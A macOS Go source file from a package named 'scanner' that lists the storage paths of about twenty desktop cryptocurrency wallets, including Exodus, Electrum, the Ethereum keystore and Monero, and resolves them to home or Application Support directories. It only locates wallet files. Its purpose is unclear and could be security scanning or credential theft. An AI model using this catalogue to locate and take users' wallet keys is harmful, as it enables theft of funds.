//go:build darwin

package scanner

import (
	"os"
	"path/filepath"
)

func getDesktopWalletPaths() []walletConfig {
	return []walletConfig{
		{"Atomic", "atomic/Local Storage/leveldb", "appdata"},
		{"Exodus", "Exodus/exodus.wallet", "appdata"},
		{"Electrum", ".electrum/wallets", "home"},
		{"Electrum-LTC", ".electrum-ltc/wallets", "home"},
		{"Ethereum", ".ethereum/keystore", "home"},
		{"Coinomi", "Coinomi/wallets", "appdata"},
		{"Ledger Live", "Ledger Live", "appdata"},
		{"Trezor Suite", "@trezor/suite-desktop", "appdata"},
		{"Wasabi", "WalletWasabi/Client/Wallets", "appdata"},
		{"Daedalus", "Daedalus Mainnet", "appdata"},
		{"Sparrow", "Sparrow", "appdata"},
		{"Blockstream Green", "Blockstream Green", "appdata"},
		{"Bitcoin Core", "Bitcoin", "appdata"},
		{"Guarda", "Guarda", "appdata"},
		{"Jaxx Liberty", "com.liberty.jaxx", "appdata"},
		{"Binance", "Binance", "appdata"},
		{"Monero", "Documents/Monero/wallets", "home"},
		{"Feather", ".feather/wallets", "home"},
		{"Litecoin Core", "Litecoin", "appdata"},
		{"Dogecoin Core", "Dogecoin", "appdata"},
	}
}

func resolveWalletBase(base string) string {
	home, _ := os.UserHomeDir()
	switch base {
	case "home", "userprofile", "home_dot":
		if base == "home_dot" {
			return filepath.Join(home, ".")
		}
		return home
	case "appdata", "localappdata":
		return filepath.Join(home, "Library", "Application Support")
	}
	return ""
}